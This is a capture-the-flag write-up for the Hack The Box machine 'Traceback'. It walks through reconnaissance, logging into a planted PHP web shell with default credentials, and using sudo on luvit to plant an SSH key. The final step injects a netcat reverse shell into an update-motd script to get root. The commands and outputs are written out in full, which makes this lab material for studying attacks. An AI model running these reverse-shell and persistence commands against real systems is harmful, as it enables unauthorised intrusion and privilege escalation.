# User

## nmap scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## OSINT on xh4h reveals a github list of webshells

Open web server to reveal xh4h. Googling xh4h you find a github user, and then find `https://github.com/Xh4H/Web-Shells`. Trying them all reveals `http://10.10.10.181/smevk.php`, and checking the source reveals that the login is the default of `admin:admin`.

## Web Shell Console Enumeration

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
webadmin:x:1000:1000:traceback,,,:/home/webadmin:/bin/bash
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
$ whoami
webadmin
$ ls -la /home/webadmin
total 3056
drwxr-x--- 5 webadmin sysadmin    4096 Mar 24 16:32 .
drwxr-xr-x 4 root     root        4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin     290 Mar 24 19:09 .bash_history
-rw-r--r-- 1 webadmin webadmin     220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin    3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin    4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin    4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin       1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin     807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin    4096 Feb 27 06:29 .ssh
-rw-rw-r-- 1 sysadmin sysadmin     122 Mar 16 03:53 note.txt
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
$ cat /home/webadmin/.bash_history
sudo -u sysadmin /home/sysadmin/luvit test.lua

```

A little research reveals luvit can run lua and has a node api, and there's a sysadmin user we can run it as. Let's take it over.

## Adding ssh key to sysadmin

Let's create a lua script that allows us to append text to any file, and then call it with arguments to add our public key to `sysadmin`'s `authorized_keys` file:

```sh
echo 'local fs = require("fs")\nfs.appendFileSync(process.argv[2], "\\n" .. process.argv[3] .. "\\n")' > /home/webadmin/a.lua && sudo -u sysadmin /home/sysadmin/luvit /home/webadmin/a.lua /home/sysadmin/.ssh/authorized_keys "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCu9YoyfurASMpPIN/40PI8LVrV2XIMUf37JNrsG+AyhktBohSWb5A+BFKrC8BaIDtAstdjyxoqDzBSGf0LiFHaWuREd+fCVTcmmCih7N5gM8pR2gtXygza0+n7O3GvhOdpj+ZotqgFK/nIVvxHTOEu0PfjBT7Z7AwKwQWdLFLikCMbMSA2qSz16oumiKAeknTob+ZTX1VSdwLg8z28dv0K5PFqzKS0KlJ4AcXhV52jdPJSYG/X3Fm+2u7aXES/+YqFRxRpTKW8fA863T8qHDGWZDl/vbcWbz8WOw7CK16Z2pnGeylGcI64fEvPSKti0aBfftg44tL10g7rNdqumMq7ThUY5chYC7Ev4hH5YLKoA0zJVuMBcHx/Z99sQ93wo9wgbGAyul2g0LlcfyGghJbiCUXdHjssrhM903LouEcTkgkko0xZsNs31UoRBdRWuqoDrMYK5VrpgcU8laXyGOfEZ9oangs4U6JXzHeKQMg5HJaqxjNxXsAyMnbb8oJCDss="
```

## Login as sysadmin

Just ssh in with your new public key and grab user.txt

# Root

## linpeas

Run linpeas and find the following:

```shell-session
[+] Interesting GROUP writable files (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group sysadmin:
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
```

These scripts are run when any user logs in via ssh and we can write to them. If you'd like run `pspy` in one terminal, and then ssh in as `sysadmin` again in another and observe the results in `pspy`.

## Gaining Root

Let's setup a command to `00-header` that will setup a reverse shell, then quickly ssh in as `sysadmin` while setting up the listener. This should call `00-header` as root and connect to our waiting listener, giving us a shell as root.

```sh
#!/bin/sh

# Get our IP on HTB
htbip=$(ifconfig | grep "destination 10.10" | sed 's/.*destination //')
echo "htb ip ${htbip}"

ssh sysadmin@traceback.htb "echo 'tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.10.14.39 22473 1> /tmp/1' >> /etc/update-motd.d/00-header"
ssh sysadmin@traceback.htb "echo pwned" &
nc -lvp 22473
```

Once we have the reverse shell, grab `root.txt`.

```shell-session
╭─zoey@nomadic ~/htb/traceback ‹master*›
╰─$ ./own-root.sh
htb ip 10.10.14.39
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
listening on [any] 22473 ...
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
connect to [10.10.14.39] from traceback.htb [10.10.10.181] 59826
whoami
root
uname -a
Linux traceback 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
